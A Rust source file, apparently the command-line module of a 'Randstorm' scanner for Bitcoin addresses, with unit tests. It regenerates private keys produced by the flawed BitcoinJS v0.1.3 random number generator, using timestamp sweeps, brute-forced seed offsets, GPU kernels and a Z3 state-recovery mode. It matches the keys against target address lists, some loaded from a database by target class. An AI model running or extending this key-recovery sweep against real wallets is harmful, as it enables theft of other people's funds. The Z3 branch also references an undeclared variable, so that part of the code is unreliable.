//! CLI Interface for Randstorm Scanner
//!
//! Provides the command-line interface with CSV input/output, progress reporting,
//! and comprehensive error handling.
//!
//! ## Test Strategy
//!
//! Tests are organized into three levels:
//!
//! ### Unit Tests (13 tests)
//! - CSV Input: 5 tests covering valid/invalid addresses, comments, whitespace
//! - CSV Output: 5 tests for header, single/multiple findings, empty results
//! - Timestamp Formatting: 3 tests for ISO 8601, epoch zero, invalid values
//!
//! ### Integration Tests (5 tests)
//! - CLI help text validation
//! - File not found error handling
//! - Invalid phase validation
//! - Output file creation
//! - End-to-end CPU scan
//!
//! ### Test Fixtures
//! - `tests/fixtures/addresses_p2pkh.csv` - Valid P2PKH addresses
//! - `tests/fixtures/addresses_mixed.csv` - Mixed valid/invalid
//! - `tests/fixtures/addresses_edge_cases.csv` - Whitespace, comments
//!
//! All tests include TEST-ID, AC reference, and PRIORITY markers for traceability.

use super::integration::RandstormScanner;
use super::prng::bitcoinjs_v013::BitcoinJsV013Prng;
use super::prng::MathRandomEngine;
use anyhow::{Context, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::Address;
use indicatif::{ProgressBar, ProgressStyle};
use std::collections::HashSet;
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::path::Path;
use std::str::FromStr;
use tracing::info;
use super::config::{self, GpuBackend};

/// Run the Randstorm scanner with CLI arguments
pub fn run_scan(
    target_addresses_path: &Path,
    start_ms: Option<u64>,
    end_ms: Option<u64>,
    interval_ms: u64,
    phase: u8,
    mode: &str,
    force_gpu: bool,
    force_cpu: bool,
    output_path: Option<&Path>,
    backend_str: Option<&str>,
    math_random_engine: &str,
    seed_override: Option<u64>,
    seed_bruteforce_bits: Option<u8>,
    include_uncompressed: bool,
    estimate_mode: bool,
    z3_solve_input: Option<&str>,
    path_coverage: &str, // "legacy" (m/0/0 only) or "all" (BIP44/49/84/86)
    db_path: Option<&Path>,
    target_class: Option<&str>,
) -> Result<()> {

    // 1. Handle Z3 Solve Mode (Early exit)
    if let Some(_outputs_str) = z3_solve_input {
        #[cfg(feature = "z3-solver")]
        {
            info!("\u{1f9e0} Running Z3 MWC1616 State Recovery...");
            let solver = super::z3_solver::Z3MwcSolver::new();
            let outputs: Vec<u32> = outputs_str
                .split(',')
                .map(|s| {
                    if s.starts_with("0x") {
                        u32::from_str_radix(&s[2..], 16).unwrap_or(0)
                    } else {
                        s.parse::<u32>().unwrap_or(0)
                    }
                })
                .collect();

            match solver.solve_from_outputs(&outputs) {
                Ok((s1, s2)) => {
                    info!("\u{2705} Initial State Recovered!");
                    info!("   s1: 0x{:08X}", s1);
                    info!("   s2: 0x{:08X}", s2);
                    info!("   Combined Seed (approx): {}", ((s1 as u64) << 32) | (s2 as u64));
                }
                Err(e) => {
                    anyhow::bail!("Z3 Solver failed: {}", e);
                }
            }
            return Ok(());
        }
        #[cfg(not(feature = "z3-solver"))]
        {
            anyhow::bail!("Z3 solver feature is disabled. Rebuild with --features z3-solver and ensure Z3 library is installed.");
        }
    }

    // 2. Parse scan mode and phase
    let scan_mode = match mode.to_lowercase().as_str() {
        "quick" => super::config::ScanMode::Quick,
        "standard" => super::config::ScanMode::Standard,
        "deep" => super::config::ScanMode::Deep,
        "exhaustive" => super::config::ScanMode::Exhaustive,
        _ => anyhow::bail!(
            "Invalid mode: {}. Must be quick, standard, deep, or exhaustive",
            mode
        ),
    };

    // Parse GPU backend
    let gpu_backend = match backend_str {
        Some(s) => match s.to_lowercase().as_str() {
            "auto" => GpuBackend::Auto,
            "wgpu" => GpuBackend::Wgpu,
            "opencl" => GpuBackend::OpenCl,
            "cpu" => GpuBackend::Cpu,
            _ => return Err(anyhow::anyhow!("Invalid backend: must be auto, wgpu, opencl, or cpu")),
        },
        None => GpuBackend::Auto,
    };

    // Override config with backend preference
    let mut config = config::ScanConfig {
        scan_mode,
        gpu_backend,
        ..Default::default()
    };

    // Handle force flags for backward compatibility
    if force_cpu {
        config.gpu_backend = GpuBackend::Cpu;
        config.use_gpu = false;
    } else if force_gpu {
        if backend_str.is_none() {
            config.gpu_backend = GpuBackend::Auto;
        }
        config.use_gpu = true;
    } else if let GpuBackend::Cpu = gpu_backend {
        config.use_gpu = false;
    }

    let phase_enum = match phase {
        1 => super::fingerprints::Phase::One,
        2 => super::fingerprints::Phase::Two,
        3 => super::fingerprints::Phase::Three,
        _ => anyhow::bail!("Invalid phase: {}. Must be 1, 2, or 3", phase),
    };

    let engine = MathRandomEngine::from_str(math_random_engine).unwrap_or(MathRandomEngine::V8Mwc1616);

    // 3. Handle Estimate Mode (Early exit)
    if estimate_mode {
        let window_ms = if let (Some(start), Some(end)) = (start_ms, end_ms) {
            end.saturating_sub(start)
        } else {
            scan_mode.interval_ms()
        };

        let num_configs = match phase {
            1 => 100,
            2 => 500,
            _ => 2000,
        };

        let report = super::attack_estimator::AttackComplexity::estimate(
            window_ms,
            num_configs,
            &[engine],
        );
        super::attack_estimator::print_complexity_report(&report);
        return Ok(());
    }

    info!("\u{1f50d} Randstorm Scanner Starting");
    info!("Phase: {:?}", phase_enum);
    info!("Target addresses: {}", target_addresses_path.display());

    // Load target addresses from CSV
    let mut addresses = load_addresses_from_csv(target_addresses_path)
        .unwrap_or_default();

    // Load from Database if requested
    if let (Some(db), Some(class)) = (db_path, target_class) {
        info!("Loading targets from database ({}) for class: {}", db.display(), class);
        let target_db = crate::utils::db::TargetDatabase::new(db.to_path_buf())?;
        let db_targets = target_db.query_by_class(class, 1000000)?;
        for t in db_targets {
            addresses.push(t.address);
        }
    }

    if addresses.is_empty() {
        anyhow::bail!("No valid addresses found in CSV or Database");
    }

    info!("Loaded {} target addresses", addresses.len());

    if force_gpu && force_cpu {
        anyhow::bail!("Cannot specify both --gpu and --cpu flags");
    }

    // Mode selection: direct sweep if timestamps provided, else phase-based scanner.
    if let (Some(start), Some(end)) = (start_ms, end_ms) {
        // Use GPU-accelerated sweep when --gpu is requested and wgpu feature is compiled in.
        #[cfg(feature = "wgpu")]
        if force_gpu || !force_cpu {
            match gpu_direct_sweep_scan(
                &addresses,
                start,
                end,
                interval_ms,
                output_path,
                math_random_engine,
                include_uncompressed,
            ) {
                Ok(()) => return Ok(()),
                Err(e) => {
                    tracing::warn!("\u{26a0}\u{fe0f}  GPU sweep failed ({}), falling back to CPU", e);
                }
            }
        }

        // CPU fallback (or forced CPU)
        direct_sweep_scan(
            &addresses,
            start,
            end,
            interval_ms,
            output_path,
            math_random_engine,
            seed_override,
            seed_bruteforce_bits,
            include_uncompressed,
        )?;
    } else {
        // Initialize scanner with GPU/CPU preference
        let mut config = super::config::ScanConfig::default();
        config.scan_mode = scan_mode;
        config.use_gpu = if force_cpu {
            false
        } else if force_gpu {
            true
        } else {
            true
        };
        config.path_coverage = super::config::PathCoverage::from_str(path_coverage);

        let engine =
            MathRandomEngine::from_str(math_random_engine).unwrap_or(MathRandomEngine::V8Mwc1616);
        let mut scanner = RandstormScanner::with_config(config, engine)?;

        let pb = ProgressBar::new(addresses.len() as u64);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("[{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} addresses ({eta})")
                .unwrap()
                .progress_chars("#>-"),
        );

        let results = scanner.scan_with_progress(&addresses, phase_enum)?;

        pb.finish_with_message("Scan complete!");

        output_results(&results, output_path)?;

        info!(
            "\u{2705} Scan complete. Found {} vulnerable addresses",
            results.len()
        );
    }

    Ok(())
}

/// Validate bit-parity between CPU Golden Reference and GPU backends
pub fn run_validate_parity(backend_str: &str, count: u64, engine_str: &str) -> Result<()> {
    info!("\u{1f9ea} Zero-Tolerance Parity Validation");
    info!("   Backend: {}", backend_str);
    info!("   Engine:  {}", engine_str);
    info!("   Samples: {}", count);

    let engine = super::prng::MathRandomEngine::from_str(engine_str)
        .ok_or_else(|| anyhow::anyhow!("Invalid engine: {}", engine_str))?;

    #[cfg(feature = "wgpu")]
    if backend_str.to_lowercase() == "wgpu" {
        let mut wgpu = super::wgpu_integration::WgpuScanner::new(
            super::config::ScanConfig::default(),
            engine,
            None,
            true,
        )?;
        super::validator::HardwareParityChecker::validate_v8_parity(&mut wgpu, count)?;
    } else {
        info!("\u{26a0} Validation for backend '{}' not yet implemented or feature disabled.", backend_str);
    }

    #[cfg(not(feature = "wgpu"))]
    info!("\u{26a0} WGPU feature disabled. Rebuild with --features wgpu to validate.");

    Ok(())
}

/// Load Bitcoin addresses from CSV file
fn load_addresses_from_csv(path: &Path) -> Result<Vec<String>> {
    let file = File::open(path).context(format!("Failed to open CSV file: {}", path.display()))?;

    let reader = BufReader::new(file);
    let mut addresses = Vec::new();

    for (line_num, line) in reader.lines().enumerate() {
        let line = line.context(format!("Failed to read line {}", line_num + 1))?;
        let trimmed = line.trim();

        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        if trimmed.starts_with('1') || trimmed.starts_with('3') || trimmed.starts_with("bc1") {
            addresses.push(trimmed.to_string());
        } else {
            tracing::warn!(
                "Line {}: Invalid Bitcoin address format: {}",
                line_num + 1,
                trimmed
            );
        }
    }

    Ok(addresses)
}

/// Core CSV output logic (testable)
fn output_results_to_writer<W: Write>(
    results: &[super::integration::VulnerabilityFinding],
    writer: &mut W,
) -> Result<()> {
    writeln!(
        writer,
        "Address,Status,Confidence,BrowserConfig,Timestamp,DerivationPath"
    )?;

    for finding in results {
        let browser_config = format!(
            "{}/{}/{}x{}",
            finding.browser_config.user_agent,
            finding.browser_config.platform,
            finding.browser_config.screen_width,
            finding.browser_config.screen_height
        );

        let timestamp = format_timestamp(finding.timestamp);
        let confidence = format_confidence(&finding.confidence);

        writeln!(
            writer,
            "{},{},{},{},{},{}",
            finding.address,
            "VULNERABLE",
            confidence,
            browser_config,
            timestamp,
            finding.derivation_path
        )?;
    }

    writer.flush()?;
    Ok(())
}

/// Output scan results in CSV format
fn output_results(
    results: &[super::integration::VulnerabilityFinding],
    output_path: Option<&Path>,
) -> Result<()> {
    if let Some(path) = output_path {
        let mut file = File::create(path).context("Failed to create output file")?;
        output_results_to_writer(results, &mut file)
    } else {
        let mut stdout = std::io::stdout();
        output_results_to_writer(results, &mut stdout)
    }
}

/// GPU-accelerated direct sweep using WGPU (Vulkan/DX12).
///
/// Calls `WgpuScanner::sweep()` which dispatches the `randstorm_main`
/// WGSL compute shader and reads back matches via staging buffers.
/// CPU-side verification filters bloom false positives.
#[cfg(feature = "wgpu")]
fn gpu_direct_sweep_scan(
    target_addresses: &[String],
    start_ms: u64,
    end_ms: u64,
    interval_ms: u64,
    output_path: Option<&Path>,
    engine_name: &str,
    include_uncompressed: bool,
) -> Result<()> {
    use super::wgpu_integration::WgpuScanner;
    use crate::utils::gpu_bloom_filter::{compute_bloom_bits, GpuBloomConfig};

    if interval_ms == 0 { anyhow::bail!("interval_ms must be > 0"); }
    if start_ms > end_ms { anyhow::bail!("start_ms must be <= end_ms"); }

    let engine = MathRandomEngine::from_str(engine_name)
        .unwrap_or(MathRandomEngine::V8Mwc1616);

    info!("\u{1f3ae} GPU Direct Sweep mode (WGPU/Vulkan)");
    info!("   Start: {}", start_ms);
    info!("   End:   {}", end_ms);
    info!("   Interval: {} ms", interval_ms);
    info!("   Targets: {}", target_addresses.len());

    // ── Build bloom filter from target hash160s ──────────────────────────────
    let mut hash160s: Vec<Vec<u8>> = Vec::new();
    let mut target_set: HashSet<Vec<u8>> = HashSet::new();
    // addr_str → hash160 lookup for output
    let mut addr_to_h160: Vec<(String, Vec<u8>)> = Vec::new();

    for addr_str in target_addresses {
        if let Ok(addr) = Address::from_str(addr_str) {
            let script = addr.assume_checked().script_pubkey();
            let h160 = if script.is_p2pkh() {
                script.as_bytes()[3..23].to_vec()
            } else if script.is_p2sh() {
                script.as_bytes()[2..22].to_vec()
            } else {
                continue;
            };
            hash160s.push(h160.clone());
            target_set.insert(h160.clone());
            addr_to_h160.push((addr_str.clone(), h160));
        }
    }

    if hash160s.is_empty() {
        anyhow::bail!("No valid P2PKH/P2SH addresses for GPU bloom filter");
    }

    let bloom_cfg = GpuBloomConfig::default();
    let bloom_data = compute_bloom_bits(
        &hash160s,
        bloom_cfg.calculate_filter_size(),
        15,
    );

    info!("   Bloom filter: {} bytes ({} entries)", bloom_data.len(), hash160s.len());

    // ── Init GPU scanner ─────────────────────────────────────────────────────
    let config = super::config::ScanConfig {
        use_gpu: true,
        gpu_backend: super::config::GpuBackend::Wgpu,
        batch_size: Some(65_536),
        ..Default::default()
    };

    let wgpu = WgpuScanner::new(config, engine, None, include_uncompressed)
        .context("Failed to init WGPU scanner for GPU sweep")?;

    // ── Dispatch compute shader via sweep() ──────────────────────────────────
    // sweep() batches internally by 65536 timestamps and returns SeedComponents
    // for every bloom hit found by the shader.
    let total = ((end_ms.saturating_sub(start_ms)) / interval_ms) + 1;

    let pb = ProgressBar::new(total);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("[{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} timestamps ({eta}) | GPU")
            .unwrap()
            .progress_chars("\u{2588}>-"),
    );

    let seed_hits = wgpu.sweep(
        start_ms,
        end_ms,
        interval_ms as u32,
        &bloom_data,
        hash160s.len(),
    )?;

    pb.finish_with_message(format!("GPU sweep complete — {} raw hits", seed_hits.len()));

    info!("GPU raw shader hits: {}", seed_hits.len());

    // ── CPU verification: filter bloom false positives ───────────────────────
    // SeedComponents.hash160 is [u32; 5] stored little-endian by the shader.
    let mut matches: Vec<(u64, String)> = Vec::new();

    for seed in &seed_hits {
        if let Some(h160_words) = seed.hash160 {
            // Convert [u32; 5] LE → 20-byte hash160
            let mut h160_bytes = [0u8; 20];
            for (i, w) in h160_words.iter().enumerate() {
                let b = w.to_le_bytes();
                h160_bytes[i * 4..i * 4 + 4].copy_from_slice(&b);
            }
            let h160_vec = h160_bytes.to_vec();

            if target_set.contains(&h160_vec) {
                // Resolve hash160 back to address string
                for (addr_str, h) in &addr_to_h160 {
                    if *h == h160_vec {
                        matches.push((seed.timestamp_ms, addr_str.clone()));
                        break;
                    }
                }
            }
        }
    }

    // ── Write output ─────────────────────────────────────────────────────────
    let mut writer: Box<dyn Write> = if let Some(path) = output_path {
        Box::new(File::create(path).context("Failed to create output file")?)
    } else {
        Box::new(std::io::stdout())
    };

    writeln!(writer, "Timestamp,Address")?;
    for (ts, addr) in &matches {
        writeln!(writer, "{},{}", ts, addr)?;
    }
    writer.flush()?;

    info!("\u{2705} GPU Sweep complete. Matches: {}", matches.len());
    Ok(())
}

/// Direct sweep mode: iterate timestamps and replicate BitcoinJS v0.1.3 RNG to find matches.
fn direct_sweep_scan(
    target_addresses: &[String],
    start_ms: u64,
    end_ms: u64,
    interval_ms: u64,
    output_path: Option<&Path>,
    engine_name: &str,
    seed_override: Option<u64>,
    seed_bruteforce_bits: Option<u8>,
    include_uncompressed: bool,
) -> Result<()> {
    if interval_ms == 0 {
        anyhow::bail!("interval_ms must be > 0");
    }
    if start_ms > end_ms {
        anyhow::bail!("start_ms must be <= end_ms");
    }
    info!("\u{1f9ea} Direct sweep mode (BitcoinJS v0.1.3)");
    info!("   Start: {}", start_ms);
    info!("   End:   {}", end_ms);
    info!("   Interval: {} ms", interval_ms);
    info!("   Targets: {}", target_addresses.len());

    let mut target_set: HashSet<Vec<u8>> = HashSet::new();
    for addr_str in target_addresses {
        if let Ok(addr) = Address::from_str(addr_str) {
            let script = addr.assume_checked().script_pubkey();
            if script.is_p2pkh() {
                target_set.insert(script.as_bytes()[3..23].to_vec());
            } else if script.is_p2sh() {
                target_set.insert(script.as_bytes()[2..22].to_vec());
            } else {
                tracing::warn!("Unsupported address type in sweep mode: {}", addr_str);
            }
        } else {
            tracing::warn!("Invalid address skipped in sweep mode: {}", addr_str);
        }
    }

    if target_set.is_empty() {
        anyhow::bail!("No valid P2PKH/P2SH addresses to scan");
    }

    let engine = MathRandomEngine::from_str(engine_name).ok_or_else(|| {
        anyhow::anyhow!(
            "Invalid engine: {} (use v8, drand48, java, or xorshift128plus/spidermonkey/jsc)",
            engine_name
        )
    })?;

    if let Some(bits) = seed_bruteforce_bits {
        if bits > 28 {
            anyhow::bail!(
                "seed_bruteforce_bits too large ({}). Please use <=28 to avoid runaway scans.",
                bits
            );
        }
    }

    let secp = Secp256k1::new();
    let mut matches = Vec::new();

    let mut ts = start_ms;
    let total = ((end_ms.saturating_sub(start_ms)) / interval_ms) + 1;
    let pb = ProgressBar::new(total as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("[{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} timestamps ({eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    while ts <= end_ms {
        let base_seed = seed_override.unwrap_or(ts);
        let (mut offset, max_offset) = if let Some(bits) = seed_bruteforce_bits {
            let max = 1u64.checked_shl(bits as u32).unwrap_or(0);
            (0u64, max)
        } else {
            (0u64, 1u64)
        };

        while offset < max_offset {
            let seed = base_seed.wrapping_add(offset);
            let key_bytes = BitcoinJsV013Prng::generate_privkey_bytes(ts, engine, Some(seed));

            if let Ok(secret_key) = SecretKey::from_slice(&key_bytes) {
                let public_key = PublicKey::from_secret_key(&secp, &secret_key);

                let addr_comp = super::derivation::derive_p2pkh_address(&public_key);
                let mut found = false;
                if let Ok(parsed) = Address::from_str(&addr_comp) {
                    let script = parsed.assume_checked().script_pubkey();
                    let hash = if script.is_p2pkh() {
                        script.as_bytes()[3..23].to_vec()
                    } else if script.is_p2sh() {
                        script.as_bytes()[2..22].to_vec()
                    } else {
                        Vec::new()
                    };

                    if target_set.contains(&hash) {
                        matches.push((ts, addr_comp.clone()));
                        found = true;
                    }
                }

                if include_uncompressed && !found {
                    let addr_uncomp =
                        super::derivation::derive_p2pkh_address_uncompressed(&public_key);
                    if let Ok(parsed) = Address::from_str(&addr_uncomp) {
                        let script = parsed.assume_checked().script_pubkey();
                        let hash = if script.is_p2pkh() {
                            script.as_bytes()[3..23].to_vec()
                        } else if script.is_p2sh() {
                            script.as_bytes()[2..22].to_vec()
                        } else {
                            Vec::new()
                        };
                        if target_set.contains(&hash) {
                            matches.push((ts, addr_uncomp));
                        }
                    }
                }
            }
            offset = offset.saturating_add(1);
        }

        for addr in target_addresses {
            if let Some(vuln_info) = super::heuristics::check_milk_sad_correlation(ts, addr) {
                info!("\u{1f525} Found Milk Sad Correlation! Timestamp: {}, Address: {}, Vuln: {}", ts, addr, vuln_info);
                matches.push((ts, addr.clone()));
            }
        }

        ts = ts.saturating_add(interval_ms);
        pb.inc(1);
    }

    pb.finish_with_message("Sweep complete");

    let mut writer: Box<dyn Write> = if let Some(path) = output_path {
        Box::new(File::create(path).context("Failed to create output file")?)
    } else {
        Box::new(std::io::stdout())
    };

    writeln!(writer, "Timestamp,Address")?;
    for (ts, addr) in &matches {
        writeln!(writer, "{},{}", ts, addr)?;
    }
    writer.flush()?;

    info!("\u{2705} Sweep complete. Matches: {}", matches.len());
    Ok(())
}

/// Format timestamp as ISO 8601
fn format_timestamp(timestamp_ms: u64) -> String {
    let secs = timestamp_ms / 1000;
    let dt = chrono::DateTime::from_timestamp(secs as i64, 0);

    if let Some(dt) = dt {
        dt.format("%Y-%m-%dT%H:%M:%SZ").to_string()
    } else {
        timestamp_ms.to_string()
    }
}

/// Format confidence enum as string
fn format_confidence(confidence: &super::integration::Confidence) -> &'static str {
    match confidence {
        super::integration::Confidence::High => "HIGH",
        super::integration::Confidence::Medium => "MEDIUM",
        super::integration::Confidence::Low => "LOW",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_load_addresses_valid_p2pkh() {
        let mut temp_file = NamedTempFile::new().unwrap();
        writeln!(temp_file, "# Test P2PKH addresses").unwrap();
        writeln!(temp_file, "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa").unwrap();
        writeln!(temp_file, "12cbQLTFMXRnSzktFkuoG3eHoMeFtpTu3S").unwrap();
        writeln!(temp_file, "1Pji2xSZnKDLqKCp9pYNy7xRYxsKZfHLCx").unwrap();
        temp_file.flush().unwrap();

        let addresses = load_addresses_from_csv(temp_file.path()).unwrap();
        assert_eq!(addresses.len(), 3);
        assert_eq!(addresses[0], "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
    }

    #[test]
    fn test_load_addresses_mixed_valid_invalid() {
        let mut temp_file = NamedTempFile::new().unwrap();
        writeln!(temp_file, "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa").unwrap();
        writeln!(temp_file, "invalid_address_123").unwrap();
        writeln!(temp_file, "12cbQLTFMXRnSzktFkuoG3eHoMeFtpTu3S").unwrap();
        temp_file.flush().unwrap();

        let addresses = load_addresses_from_csv(temp_file.path()).unwrap();
        assert_eq!(addresses.len(), 2);
    }

    #[test]
    fn test_load_addresses_comments_and_empty() {
        let mut temp_file = NamedTempFile::new().unwrap();
        writeln!(temp_file, "# Comment line").unwrap();
        writeln!(temp_file).unwrap();
        writeln!(temp_file, "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa").unwrap();
        writeln!(temp_file).unwrap();
        writeln!(temp_file, "# Another comment").unwrap();
        writeln!(temp_file, "12cbQLTFMXRnSzktFkuoG3eHoMeFtpTu3S").unwrap();
        temp_file.flush().unwrap();

        let addresses = load_addresses_from_csv(temp_file.path()).unwrap();
        assert_eq!(addresses.len(), 2);
    }

    #[test]
    fn test_load_addresses_file_not_found() {
        let result = load_addresses_from_csv(Path::new("/nonexistent/file.csv"));
        assert!(result.is_err());
        let err_msg = format!("{:?}", result.unwrap_err());
        assert!(err_msg.contains("Failed to open CSV file"));
    }

    #[test]
    fn test_load_addresses_whitespace_only() {
        let mut temp_file = NamedTempFile::new().unwrap();
        writeln!(temp_file, "   1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa   ").unwrap();
        writeln!(temp_file, "  ").unwrap();
        writeln!(temp_file, "\t\t").unwrap();
        temp_file.flush().unwrap();

        let addresses = load_addresses_from_csv(temp_file.path()).unwrap();
        assert_eq!(addresses.len(), 1);
        assert_eq!(addresses[0], "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
    }

    #[test]
    fn test_format_confidence() {
        use super::super::integration::Confidence;
        assert_eq!(format_confidence(&Confidence::High), "HIGH");
        assert_eq!(format_confidence(&Confidence::Medium), "MEDIUM");
        assert_eq!(format_confidence(&Confidence::Low), "LOW");
    }

    #[test]
    fn test_output_results_header() {
        use super::super::integration::VulnerabilityFinding;
        let results: Vec<VulnerabilityFinding> = vec![];
        let mut output = Vec::new();
        output_results_to_writer(&results, &mut output).unwrap();
        let output_str = String::from_utf8(output).unwrap();
        assert!(output_str.starts_with("Address,Status,Confidence,BrowserConfig,Timestamp,DerivationPath"));
    }

    #[test]
    fn test_output_results_single_finding() {
        use super::super::fingerprints::BrowserConfig;
        use super::super::integration::{Confidence, VulnerabilityFinding};

        let finding = VulnerabilityFinding {
            address: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa".to_string(),
            confidence: Confidence::High,
            browser_config: BrowserConfig {
                user_agent: "Chrome/25".to_string(),
                platform: "Win32".to_string(),
                screen_width: 1366,
                screen_height: 768,
                ..Default::default()
            },
            timestamp: 1365000000000,
            derivation_path: "m/0'/0/0".to_string(),
        };

        let mut output = Vec::new();
        output_results_to_writer(&[finding], &mut output).unwrap();
        let output_str = String::from_utf8(output).unwrap();

        assert!(output_str.contains("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"));
        assert!(output_str.contains("VULNERABLE"));
        assert!(output_str.contains("HIGH"));
        assert!(output_str.contains("Chrome/25/Win32/1366x768"));
    }

    #[test]
    fn test_output_results_multiple_findings() {
        use super::super::fingerprints::BrowserConfig;
        use super::super::integration::{Confidence, VulnerabilityFinding};

        let findings = vec![
            VulnerabilityFinding {
                address: "1Address1".to_string(),
                confidence: Confidence::High,
                browser_config: BrowserConfig::default(),
                timestamp: 1000000000,
                derivation_path: "m/0'/0/0".to_string(),
            },
            VulnerabilityFinding {
                address: "1Address2".to_string(),
                confidence: Confidence::Medium,
                browser_config: BrowserConfig::default(),
                timestamp: 2000000000,
                derivation_path: "m/0'/0/1".to_string(),
            },
        ];

        let mut output = Vec::new();
        output_results_to_writer(&findings, &mut output).unwrap();
        let output_str = String::from_utf8(output).unwrap();

        let lines: Vec<&str> = output_str.lines().collect();
        assert_eq!(lines.len(), 3);
        assert!(output_str.contains("1Address1"));
        assert!(output_str.contains("1Address2"));
    }

    #[test]
    fn test_output_results_empty() {
        use super::super::integration::VulnerabilityFinding;
        let results: Vec<VulnerabilityFinding> = vec![];
        let mut output = Vec::new();
        output_results_to_writer(&results, &mut output).unwrap();
        let output_str = String::from_utf8(output).unwrap();
        let lines: Vec<&str> = output_str.lines().collect();
        assert_eq!(lines.len(), 1);
    }

    #[test]
    fn test_format_timestamp_iso8601() {
        let timestamp_ms = 1365000000000;
        let formatted = format_timestamp(timestamp_ms);
        assert_eq!(formatted, "2013-04-03T14:40:00Z");
    }

    #[test]
    fn test_format_timestamp_epoch_zero() {
        let timestamp_ms = 0;
        let formatted = format_timestamp(timestamp_ms);
        assert_eq!(formatted, "1970-01-01T00:00:00Z");
    }

    #[test]
    fn test_format_timestamp_invalid() {
        let timestamp_ms = u64::MAX;
        let formatted = format_timestamp(timestamp_ms);
        assert_eq!(formatted, u64::MAX.to_string());
    }

    #[test]
    fn test_cli_mode_flag() {
        use super::super::config::ScanMode;
        assert_eq!(ScanMode::Quick.interval_ms(), 126_000_000);
        assert_eq!(ScanMode::Standard.interval_ms(), 3_600_000);
        assert_eq!(ScanMode::Deep.interval_ms(), 60_000);
        assert_eq!(ScanMode::Exhaustive.interval_ms(), 1_000);
    }
}
